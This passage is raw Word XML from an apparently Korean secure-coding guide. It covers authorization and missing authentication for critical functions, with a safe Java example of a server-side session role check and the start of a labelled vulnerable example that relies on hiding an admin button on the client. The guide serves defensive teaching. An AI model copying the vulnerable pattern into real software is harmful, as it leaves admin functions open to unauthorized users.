                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>설정</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>변경</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>등</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>관리자</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>전용</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>기능을</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>아무</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>제한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>없이</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>사용할</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>수</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>있게</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>됩니다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pP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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E2EFDA"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>안전한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>코드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>예</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>// [</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>안전</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>서버의</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>세션에서</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>역할</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>값을</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>조회</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">String role = (String) session.getAttribute("role");  // </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>서버에서</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>관리</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>if ("admin".equals(role)) { doAdminTask(); }</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E"/>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
      <w:pPr>
        <w:pStyle w:val="1"/>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="1F3564"/>
          <w:sz w:val="26"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>제</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="1F3564"/>
          <w:sz w:val="26"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="1F3564"/>
          <w:sz w:val="26"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>절</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="1F3564"/>
          <w:sz w:val="26"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="1F3564"/>
          <w:sz w:val="26"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>보안기능</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B30C6E" w:rsidRPr="009B5E15" w:rsidRDefault="00B31433">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">  1. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>적절한</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>인증</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>없는</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>중요기능</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>허용</w:t>
      </w:r>
      <w:r w:rsidR="009B5E15">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="009B5E15">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>– 2</w:t>
      </w:r>
      <w:r w:rsidR="009B5E15">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>중</w:t>
      </w:r>
      <w:r w:rsidR="009B5E15">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="009B5E15">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>인증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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFF2CC"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>준수사항</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:ind w:left="170"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">• </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>클라이언트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보안검사를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우회하여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서버에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접근하지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못하도록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설계한다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:ind w:left="170"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">• </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>중요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기능</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>(</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>계좌이체</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>비밀번호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변경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등</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>)</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>이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있는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페이지는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재인증을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적용한다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:ind w:left="170"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">• </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>모든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중요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요청은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서버에서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세션</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>/</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>인증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상태를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반드시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검증한다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pP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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FCE4D6"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>취약한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>코드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>예</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>// [</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>취약</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>클라이언트</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>측</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>버튼</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>숨김만으로</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>접근</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>제어</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">// </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>관리자</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>버튼은</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>숨겨놓았지만</w:t>
            </w:r>
            <w:r>
              <w:rPr>
